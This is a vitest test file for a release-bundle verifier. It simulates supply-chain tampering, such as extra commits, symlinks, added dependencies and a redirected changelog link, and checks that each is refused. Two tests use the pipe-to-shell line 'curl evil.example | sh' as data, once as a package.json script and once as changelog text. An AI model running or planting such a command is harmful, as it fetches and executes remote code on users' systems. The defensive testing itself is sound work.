import { chmodSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

import { applyStandardRelease } from '#release_workflow/apply_standard_release.ts';
import { replaceInFile, writeFileIn } from '#release_workflow/edit_files.ts';
import {
	BASE_VERSION,
	buildCargoLock,
	buildCargoToml,
	buildChangelog,
	buildPackageJson,
	NEW_VERSION,
} from '#release_workflow/release_fixtures.ts';
import {
	type CandidateEdit,
	createReleaseScenario,
	type ReleaseScenario,
} from '#release_workflow/release_scenario.ts';
import { runGit } from '#release_workflow/run_git.ts';

const CARGO_VERSION_FILES = 'package.json Cargo.toml Cargo.lock';

function releaseWith(edit: CandidateEdit): CandidateEdit {
	return (directory) => {
		applyStandardRelease(directory);
		edit(directory);
	};
}

describe('release bundle verification (attacks)', () => {
	let scenario: ReleaseScenario;

	function startScenario(extraFiles: Record<string, string> = {}): void {
		scenario = createReleaseScenario({
			baseFiles: {
				'package.json': buildPackageJson(BASE_VERSION),
				'CHANGELOG.md': buildChangelog(),
				...extraFiles,
			},
		});
	}

	afterEach(() => {
		scenario.cleanup();
	});

	it('should refuse a bundle with an extra commit on top of the release commit', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				applyStandardRelease,
				(directory) => writeFileIn(directory, 'backdoor.txt', 'x\n'),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('release commit parent is'),
		});
	});

	it('should refuse a release commit whose parent is not the workflow commit', () => {
		startScenario();
		scenario.addCandidate({
			commits: [applyStandardRelease],
			startFrom: 'diverged',
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('release commit parent is'),
		});
	});

	it('should ignore every ref of the bundle except the release candidate', () => {
		startScenario();
		const candidateSha = scenario.addCandidate({
			commits: [applyStandardRelease],
			extraBranchCommits: [
				(directory) =>
					writeFileIn(directory, 'package.json', '{"version":"6.6.6"}\n'),
			],
		});

		const { exitCode, outputs } = scenario.verify();

		expect(exitCode).toBe(0);
		expect(
			runGit(scenario.publishDirectory, [
				'rev-parse',
				`${outputs['sha']}^{tree}`,
			])
		).toBe(
			runGit(scenario.publishDirectory, ['rev-parse', `${candidateSha}^{tree}`])
		);
	});

	it('should refuse a bundle that has no release candidate ref', () => {
		startScenario();
		scenario.addCandidate({
			commits: [applyStandardRelease],
			extraBranchCommits: [applyStandardRelease],
			omitCandidateBranch: true,
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining(
				'the bundle has no refs/heads/release-candidate'
			),
		});
	});

	it('should refuse an artifact that holds more than one file', () => {
		startScenario();
		scenario.addCandidate({ commits: [applyStandardRelease] });
		writeFileSync(join(scenario.bundleDirectory, 'second.bundle'), 'x');

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('exactly one file, found 2'),
		});
	});

	it('should refuse an artifact whose only entry is a symlink', () => {
		startScenario();
		scenario.addCandidate({ commits: [applyStandardRelease] });
		const bundlePath = join(scenario.bundleDirectory, 'release.bundle');
		rmSync(bundlePath);
		symlinkSync('/etc/hostname', bundlePath);

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('not a regular file'),
		});
	});

	it('should refuse a changed script in package.json', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				releaseWith((directory) =>
					replaceInFile(
						directory,
						'package.json',
						'release-it',
						'curl evil.example | sh'
					)
				),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('package.json changes more than'),
		});
	});

	it('should refuse a dependency bumped to the old version in package.json', () => {
		startScenario({
			'package.json': buildPackageJson(BASE_VERSION).replace(
				'^2.9.1',
				BASE_VERSION
			),
		});
		scenario.addCandidate({
			commits: [
				(directory) => {
					applyStandardRelease(directory);
					writeFileIn(
						directory,
						'package.json',
						buildPackageJson(NEW_VERSION).replace('^2.9.1', NEW_VERSION)
					);
				},
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('package.json changes more than'),
		});
	});

	it('should refuse a dependency added to Cargo.toml and Cargo.lock', () => {
		startScenario({
			'Cargo.toml': buildCargoToml(BASE_VERSION),
			'Cargo.lock': buildCargoLock(BASE_VERSION),
		});
		scenario.addCandidate({
			commits: [
				(directory) => {
					applyStandardRelease(directory);
					writeFileIn(
						directory,
						'Cargo.toml',
						`${buildCargoToml(NEW_VERSION)}evil = "1"\n`
					);
					writeFileIn(
						directory,
						'Cargo.lock',
						`${buildCargoLock(NEW_VERSION)}\n[[package]]\nname = "evil"\nversion = "1.0.0"\n`
					);
				},
			],
		});

		expect(
			scenario.verify({ versionFiles: CARGO_VERSION_FILES })
		).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('changes more than replacing'),
		});
	});

	it('should refuse a non-version line changed in a version file', () => {
		startScenario({ 'Cargo.toml': buildCargoToml(BASE_VERSION) });
		scenario.addCandidate({
			commits: [
				(directory) => {
					applyStandardRelease(directory);
					writeFileIn(
						directory,
						'Cargo.toml',
						buildCargoToml(NEW_VERSION).replace(
							'edition = "2021"',
							'edition = "2024"'
						)
					);
				},
			],
		});

		expect(
			scenario.verify({ versionFiles: 'package.json Cargo.toml' })
		).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('Cargo.toml changes more than replacing'),
		});
	});

	it('should refuse an added file', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				releaseWith((directory) => writeFileIn(directory, 'evil.sh', 'x\n')),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('added, deleted or moved'),
		});
	});

	it('should refuse a deleted file', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				releaseWith((directory) => rmSync(join(directory, 'README.md'))),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('README.md is added, deleted or moved'),
		});
	});

	it('should refuse an executable bit on a version file', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				releaseWith((directory) =>
					chmodSync(join(directory, 'CHANGELOG.md'), 0o755)
				),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('changes its file mode'),
		});
	});

	it('should refuse a changelog replaced by a symlink', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				releaseWith((directory) => {
					rmSync(join(directory, 'CHANGELOG.md'));
					symlinkSync('package.json', join(directory, 'CHANGELOG.md'));
				}),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('CHANGELOG.md'),
		});
	});

	it('should refuse injected text in the changelog', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				(directory) => {
					applyStandardRelease(directory);
					replaceInFile(
						directory,
						'CHANGELOG.md',
						'- A feature.',
						'- A feature.\n- Run curl evil.example | sh'
					);
				},
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining(
				'added line: - Run curl evil.example | sh'
			),
		});
	});

	it('should refuse a changelog link that points outside the repository', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				(directory) => {
					applyStandardRelease(directory);
					replaceInFile(
						directory,
						'CHANGELOG.md',
						'github.com/minimalstuff/tooling/compare/v0.11.0...v0.12.0',
						'evil.example/compare/v0.11.0...v0.12.0'
					);
				},
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('added line: [0.12.0]'),
		});
	});

	it('should refuse a changelog that loses an entry', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				(directory) => {
					applyStandardRelease(directory);
					replaceInFile(directory, 'CHANGELOG.md', '- An older feature.\n', '');
				},
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('removed line: - An older feature.'),
		});
	});

	it('should refuse a file that is not listed in the inputs', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				(directory) => {
					applyStandardRelease(directory);
					writeFileIn(directory, 'README.md', 'changed\n');
				},
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('README.md is not listed'),
		});
	});

	it('should refuse a version that is not a semantic version', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				(directory) =>
					writeFileIn(directory, 'package.json', buildPackageJson('1.0')),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining(
				"the new version '1.0' is not a semantic version"
			),
		});
	});

	it('should refuse a package.json version that is not a string', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				(directory) =>
					writeFileIn(
						directory,
						'package.json',
						buildPackageJson(BASE_VERSION).replace('"0.11.0"', '12')
					),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining(
				"the new version '' is not a semantic version"
			),
		});
	});

	it('should refuse a release that keeps the same version', () => {
		startScenario();
		scenario.addCandidate({
			commits: [
				(directory) =>
					writeFileIn(
						directory,
						'CHANGELOG.md',
						buildChangelog().replace('A feature', 'Another')
					),
			],
		});

		expect(scenario.verify()).toMatchObject({
			exitCode: 1,
			output: expect.stringContaining('changes no version file'),
		});
	});
});
